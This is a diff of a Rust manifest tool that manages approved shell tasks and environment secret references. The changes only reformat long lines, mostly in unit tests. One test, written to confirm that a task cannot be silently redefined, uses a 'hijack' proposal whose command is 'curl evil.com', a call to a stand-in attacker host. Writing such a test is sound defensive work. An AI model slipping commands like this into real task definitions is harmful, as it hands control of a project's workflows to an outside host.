@@ -72,7 +72,11 @@ pub struct Proposal {
 impl Proposal {
     /// The diff a human is asked to approve.
     pub fn snippet(&self) -> String {
-        format!("[tasks]\n{} = \"{}\"\n", self.name, self.command.replace('"', "\\\""))
+        format!(
+            "[tasks]\n{} = \"{}\"\n",
+            self.name,
+            self.command.replace('"', "\\\"")
+        )
     }
 }
 
@@ -87,7 +91,13 @@ fn suggest_name(command: &str) -> String {
         .trim_end_matches(".py");
     let cleaned: String = base
         .chars()
-        .map(|c| if c.is_ascii_alphanumeric() || c == '_' || c == '-' { c } else { '_' })
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
+                c
+            } else {
+                '_'
+            }
+        })
         .collect();
     let cleaned = cleaned.trim_matches('_').to_string();
     if cleaned.is_empty() {
@@ -110,7 +120,10 @@ impl Manifest {
         for (name, env) in &m.env {
             if let Some(parent) = &env.extends {
                 if parent == name {
-                    return Err(Error::Parse(format!("environment `{}` extends itself", name)));
+                    return Err(Error::Parse(format!(
+                        "environment `{}` extends itself",
+                        name
+                    )));
                 }
                 if !m.env.contains_key(parent) {
                     return Err(Error::Parse(format!(
@@ -173,7 +186,10 @@ impl Manifest {
             name = format!("{}{}", base, n);
             n += 1;
         }
-        Some(Proposal { name, command: command.to_string() })
+        Some(Proposal {
+            name,
+            command: command.to_string(),
+        })
     }
 
     /// Record an approval. Refuses to silently redefine an existing task.
@@ -187,7 +203,8 @@ impl Manifest {
             }
             return Ok(());
         }
-        self.tasks.insert(proposal.name.clone(), proposal.command.clone());
+        self.tasks
+            .insert(proposal.name.clone(), proposal.command.clone());
         Ok(())
     }
 
@@ -216,7 +233,11 @@ impl Manifest {
     /// Every reference an environment needs, for checking what is missing on
     /// this machine.
     pub fn refs_for(&self, env: &str) -> Result<Vec<String>> {
-        Ok(self.resolve_env(env)?.values().map(|b| b.reference().to_string()).collect())
+        Ok(self
+            .resolve_env(env)?
+            .values()
+            .map(|b| b.reference().to_string())
+            .collect())
     }
 }
 
@@ -291,16 +312,28 @@ STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
         let p = man.propose("pnpm test").unwrap();
         man.approve(&p).unwrap();
         assert!(man.approves("pnpm test"));
-        assert!(man.propose("pnpm test").is_none(), "once approved, never asked again");
+        assert!(
+            man.propose("pnpm test").is_none(),
+            "once approved, never asked again"
+        );
     }
 
     #[test]
     fn approving_twice_is_harmless_but_redefining_is_refused() {
         let mut man = m();
-        let p = Proposal { name: "deploy".into(), command: "./scripts/deploy.sh".into() };
-        assert!(man.approve(&p).is_ok(), "same command, same name is a no-op");
+        let p = Proposal {
+            name: "deploy".into(),
+            command: "./scripts/deploy.sh".into(),
+        };
+        assert!(
+            man.approve(&p).is_ok(),
+            "same command, same name is a no-op"
+        );
 
-        let hijack = Proposal { name: "deploy".into(), command: "curl evil.com".into() };
+        let hijack = Proposal {
+            name: "deploy".into(),
+            command: "curl evil.com".into(),
+        };
         assert!(
             matches!(man.approve(&hijack), Err(Error::Constraint(_))),
             "an existing task must not be silently redefined"
@@ -321,13 +354,20 @@ STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
     #[test]
     fn environments_inherit_and_override() {
         let env = m().resolve_env("production").unwrap();
-        assert_eq!(env.get("LOG_LEVEL").unwrap().reference(), "app/log_level", "inherited");
+        assert_eq!(
+            env.get("LOG_LEVEL").unwrap().reference(),
+            "app/log_level",
+            "inherited"
+        );
         assert_eq!(
             env.get("DATABASE_URL").unwrap().reference(),
             "hardroad/db_url",
             "overridden by the nearer definition"
         );
-        assert_eq!(env.get("STRIPE_SECRET_KEY").unwrap().reference(), "stripe/sk_live");
+        assert_eq!(
+            env.get("STRIPE_SECRET_KEY").unwrap().reference(),
+            "stripe/sk_live"
+        );
     }
 
     #[test]
@@ -341,12 +381,18 @@ STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
     fn refs_are_listed_for_checking_a_machine() {
         let mut refs = m().refs_for("production").unwrap();
         refs.sort();
-        assert_eq!(refs, vec!["app/log_level", "hardroad/db_url", "stripe/sk_live"]);
+        assert_eq!(
+            refs,
+            vec!["app/log_level", "hardroad/db_url", "stripe/sk_live"]
+        );
     }
 
     #[test]
     fn an_unknown_environment_is_an_error() {
-        assert!(matches!(m().resolve_env("staging"), Err(Error::NotFound(_))));
+        assert!(matches!(
+            m().resolve_env("staging"),
+            Err(Error::NotFound(_))
+        ));
     }
 
     #[test]
@@ -360,14 +406,20 @@ STRIPE_SECRET_KEY = { ref = "stripe/sk_live", approve = true }
 
     #[test]
     fn bad_manifests_are_rejected() {
-        assert!(matches!(Manifest::from_toml("version = 2"), Err(Error::Parse(_))));
+        assert!(matches!(
+            Manifest::from_toml("version = 2"),
+            Err(Error::Parse(_))
+        ));
 
         let dangling = r#"
 version = 1
 [env.a]
 extends = "ghost"
 "#;
-        assert!(matches!(Manifest::from_toml(dangling), Err(Error::Parse(_))));
+        assert!(matches!(
+            Manifest::from_toml(dangling),
+            Err(Error::Parse(_))
+        ));
 
         let selfref = r#"
 version = 1
